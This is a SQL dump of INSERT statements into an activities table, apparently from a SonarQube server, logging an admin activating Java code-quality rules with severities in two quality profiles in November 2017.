INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2891, '2017-11-20 12:19:15.133', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3398;ruleKey=squid:S3398;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkY9bbGRdfPp-rKv');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2892, '2017-11-20 12:19:15.174', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3400;ruleKey=squid:S3400;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkZmbbGRdfPp-rKw');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2893, '2017-11-20 12:19:15.204', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3415;ruleKey=squid:S3415;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkaEbbGRdfPp-rKx');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2894, '2017-11-20 12:19:15.24', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3421;ruleKey=squid:S3421;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkaobbGRdfPp-rKy');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2895, '2017-11-20 12:19:15.279', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3422;ruleKey=squid:S3422;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkbPbbGRdfPp-rKz');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2896, '2017-11-20 12:19:15.319', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3436;ruleKey=squid:S3436;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkb3bbGRdfPp-rK0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2897, '2017-11-20 12:19:15.359', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3437;ruleKey=squid:S3437;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkcfbbGRdfPp-rK1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2898, '2017-11-20 12:19:15.403', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3438;ruleKey=squid:S3438;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkdLbbGRdfPp-rK2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2899, '2017-11-20 12:19:15.483', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3457;ruleKey=squid:S3457;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkebbbGRdfPp-rK3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2900, '2017-11-20 12:19:15.536', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3516;ruleKey=squid:S3516;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkfQbbGRdfPp-rK4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2901, '2017-11-20 12:19:15.61', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3518;ruleKey=squid:S3518;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkgabbGRdfPp-rK5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2902, '2017-11-20 12:19:15.661', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3599;ruleKey=squid:S3599;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkhNbbGRdfPp-rK6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2903, '2017-11-20 12:19:15.724', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3631;ruleKey=squid:S3631;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkiMbbGRdfPp-rK7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2904, '2017-11-20 12:19:15.764', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3655;ruleKey=squid:S3655;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXki0bbGRdfPp-rK8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2905, '2017-11-20 12:19:15.803', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3725;ruleKey=squid:S3725;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkjbbbGRdfPp-rK9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2906, '2017-11-20 12:19:15.844', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3776;ruleKey=squid:S3776;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;param_Threshold=15;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkkEbbGRdfPp-rK-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2907, '2017-11-20 12:19:15.872', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3824;ruleKey=squid:S3824;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkkgbbGRdfPp-rK_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2908, '2017-11-20 12:19:15.91', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3878;ruleKey=squid:S3878;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXklGbbGRdfPp-rLA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2909, '2017-11-20 12:19:15.934', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3923;ruleKey=squid:S3923;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXklebbGRdfPp-rLB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2910, '2017-11-20 12:19:15.971', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3958;ruleKey=squid:S3958;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkmDbbGRdfPp-rLC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2911, '2017-11-20 12:19:16.01', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3959;ruleKey=squid:S3959;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkmqbbGRdfPp-rLD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2912, '2017-11-20 12:19:16.05', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3972;ruleKey=squid:S3972;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXknSbbGRdfPp-rLE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2913, '2017-11-20 12:19:16.078', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3981;ruleKey=squid:S3981;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXknubbGRdfPp-rLF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2914, '2017-11-20 12:19:16.117', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3984;ruleKey=squid:S3984;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkoVbbGRdfPp-rLG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2915, '2017-11-20 12:19:16.149', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3985;ruleKey=squid:S3985;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXko1bbGRdfPp-rLH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2916, '2017-11-20 12:19:16.182', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S3986;ruleKey=squid:S3986;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkpWbbGRdfPp-rLI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2917, '2017-11-20 12:19:16.209', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S4032;ruleKey=squid:S4032;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkpxbbGRdfPp-rLJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2918, '2017-11-20 12:19:16.237', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S4034;ruleKey=squid:S4034;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkqNbbGRdfPp-rLK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2919, '2017-11-20 12:19:16.257', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S4042;ruleKey=squid:S4042;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkqhbbGRdfPp-rLL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2920, '2017-11-20 12:19:16.274', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S4065;ruleKey=squid:S4065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkqybbGRdfPp-rLM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2921, '2017-11-20 12:19:16.292', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S4087;ruleKey=squid:S4087;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkrEbbGRdfPp-rLN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2922, '2017-11-20 12:19:16.318', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S4143;ruleKey=squid:S4143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkrebbGRdfPp-rLO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2923, '2017-11-20 12:19:16.351', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S4144;ruleKey=squid:S4144;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkr_bbGRdfPp-rLP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2924, '2017-11-20 12:19:16.382', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S4165;ruleKey=squid:S4165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXksebbGRdfPp-rLQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2925, '2017-11-20 12:19:16.411', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:S899;ruleKey=squid:S899;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXks7bbGRdfPp-rLR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2926, '2017-11-20 12:19:16.444', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXktcbbGRdfPp-rLS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2927, '2017-11-20 12:19:16.492', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkuMbbGRdfPp-rLT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2928, '2017-11-20 12:19:16.558', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkvObbGRdfPp-rLU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2929, '2017-11-20 12:19:16.652', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp001-13826;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXkwsbbGRdfPp-rLV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2930, '2017-11-20 12:20:14.617', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:common-java:DuplicatedBlocks;ruleKey=common-java:DuplicatedBlocks;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXy6ZbbGRdfPp-rLW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2931, '2017-11-20 12:20:14.708', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXy70bbGRdfPp-rLX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2932, '2017-11-20 12:20:14.766', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:CallToDeprecatedMethod;ruleKey=squid:CallToDeprecatedMethod;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXy8ubbGRdfPp-rLY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2933, '2017-11-20 12:20:14.804', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:ClassVariableVisibilityCheck;ruleKey=squid:ClassVariableVisibilityCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXy9UbbGRdfPp-rLZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2934, '2017-11-20 12:20:14.841', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:CommentedOutCodeLine;ruleKey=squid:CommentedOutCodeLine;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXy95bbGRdfPp-rLa');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2935, '2017-11-20 12:20:14.876', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXy-cbbGRdfPp-rLb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2936, '2017-11-20 12:20:14.904', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:ForLoopCounterChangedCheck;ruleKey=squid:ForLoopCounterChangedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXy-4bbGRdfPp-rLc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2937, '2017-11-20 12:20:14.927', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:HiddenFieldCheck;ruleKey=squid:HiddenFieldCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXy_PbbGRdfPp-rLd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2938, '2017-11-20 12:20:14.956', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:LabelsShouldNotBeUsedCheck;ruleKey=squid:LabelsShouldNotBeUsedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXy_sbbGRdfPp-rLe');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2939, '2017-11-20 12:20:14.976', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:MaximumInheritanceDepth;ruleKey=squid:MaximumInheritanceDepth;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_max=5;param_filteredClasses=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzAAbbGRdfPp-rLf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2940, '2017-11-20 12:20:15.003', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:MissingDeprecatedCheck;ruleKey=squid:MissingDeprecatedCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzAbbbGRdfPp-rLg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2941, '2017-11-20 12:20:15.045', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:ModifiersOrderCheck;ruleKey=squid:ModifiersOrderCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzBFbbGRdfPp-rLh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2942, '2017-11-20 12:20:15.072', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:ObjectFinalizeCheck;ruleKey=squid:ObjectFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzBgbbGRdfPp-rLi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2943, '2017-11-20 12:20:15.099', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;ruleKey=squid:ObjectFinalizeOverridenCallsSuperFinalizeCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzB7bbGRdfPp-rLj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2944, '2017-11-20 12:20:15.117', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:ObjectFinalizeOverridenCheck;ruleKey=squid:ObjectFinalizeOverridenCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzCNbbGRdfPp-rLk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2945, '2017-11-20 12:20:15.144', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:RedundantThrowsDeclarationCheck;ruleKey=squid:RedundantThrowsDeclarationCheck;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzCobbGRdfPp-rLl');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2946, '2017-11-20 12:20:15.172', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S00100;ruleKey=squid:S00100;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzDEbbGRdfPp-rLm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2947, '2017-11-20 12:20:15.197', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S00101;ruleKey=squid:S00101;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzDdbbGRdfPp-rLn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2948, '2017-11-20 12:20:15.237', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S00107;ruleKey=squid:S00107;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_max=7;param_constructorMax=7;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzEFbbGRdfPp-rLo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2949, '2017-11-20 12:20:15.264', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S00108;ruleKey=squid:S00108;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzEgbbGRdfPp-rLp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2950, '2017-11-20 12:20:15.296', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S00112;ruleKey=squid:S00112;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzFAbbGRdfPp-rLq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2951, '2017-11-20 12:20:15.317', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248:squid:S00114;ruleKey=squid:S00114;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lenatest_001-03248;param_format=^[A-Z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZXzFVbbGRdfPp-rLr');
